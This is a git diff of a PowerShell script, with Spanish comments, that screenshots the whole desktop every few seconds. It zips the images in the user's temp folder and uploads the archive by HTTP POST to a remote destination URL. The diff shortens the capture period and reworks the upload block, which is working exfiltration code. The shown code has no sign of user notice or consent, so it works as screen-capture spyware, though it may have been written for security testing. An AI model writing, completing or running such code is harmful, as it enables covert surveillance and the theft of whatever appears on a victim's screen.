@@ -3,7 +3,7 @@ Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
 $screen = [Windows.Forms.SystemInformation]::VirtualScreen
-$totalTime = 300  # Duración total en segundos
+$totalTime = 30  # Duración total en segundos
 $interval = 3    # Intervalo entre capturas en segundos
 $numberOfCaptures = $totalTime / $interval
 
@@ -29,23 +29,33 @@ for ($i = 0; $i -lt $numberOfCaptures; $i++) {
 $zipFilePath = "$env:TEMP\collection.zip"
 [IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
 Start-Sleep 20
-#$fileContent = Get-Item -Path $zipFilePath
-#Invoke-RestMethod -Uri $destinationUrl -Method Post -Form @{ "file" = [IO.File]::OpenRead($zipFilePath) }
-#Start-Sleep 4
-$client = New-Object System.Net.Http.HttpClient
-$multipartContent = New-Object System.Net.Http.MultipartFormDataContent
-$fileStream = [IO.File]::OpenRead($zipFilePath)
-$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-$fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/zip")
+if (Test-Path $zipFilePath) {
+    Write-Host "Zip file found at: $zipFilePath"
 
-$multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
+    # Crear un cliente HTTP
+    $client = New-Object System.Net.Http.HttpClient
+    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
+    $fileStream = [IO.File]::OpenRead($zipFilePath)
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+    $fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/zip")
 
-$response = $client.PostAsync($destinationUrl, $multipartContent).Result
+    # Añadir el archivo al contenido multipart
+    $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
 
-if ($response.IsSuccessStatusCode) {
-    Write-Host "File uploaded successfully!"
+    # Hacer la solicitud POST
+    $response = $client.PostAsync($destinationUrl, $multipartContent).Result
+
+    # Verificar el resultado
+    if ($response.IsSuccessStatusCode) {
+        Write-Host "File uploaded successfully!"
+    } else {
+        Write-Host "Failed to upload file. Status code:" $response.StatusCode
+    }
+
+    # Cerrar el Stream
+    $fileStream.Close()
 } else {
-    Write-Host "Failed to upload file. Status code:" $response.StatusCode
+    Write-Host "The zip file was not found."
 }
 
 Start-Sleep 4
